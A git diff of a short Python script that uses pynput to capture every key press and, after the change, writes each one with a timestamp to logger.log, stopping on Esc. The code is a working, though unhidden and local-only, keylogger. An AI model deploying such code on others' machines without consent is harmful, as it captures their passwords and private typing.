@@ -1,28 +1,20 @@
-import os
-import string
+import logging
 from pynput import keyboard
 
-if not os.path.exists('/home/umang/python-scripts/test.txt'):
-    os.mknod('/home/umang/python-scripts/test.txt')
 
-file = open("test.txt", "w")
-current = []
+logging.basicConfig(filename='logger.log', level=logging.DEBUG,
+                    format='%(asctime)s %(message)s',
+                    datefmt='%m/%d/%Y %I:%M:%S %p')
 
 
 def on_press(key):
-
-    current.append(str(key))
-    print(current)
-
     if key == keyboard.Key.esc:
-        try:
-            stri = ''.join(current)
-        except AttributeError:
-            stri = string.join(current, '')
-
-        file.write(stri)
         listener.stop()
-        file.close()
+        logging.warning('listener is stopped...')
+
+    else:
+        message = '{} is pressed'.format(key)
+        logging.warning(message)
 
 
 with keyboard.Listener(on_press=on_press) as listener:
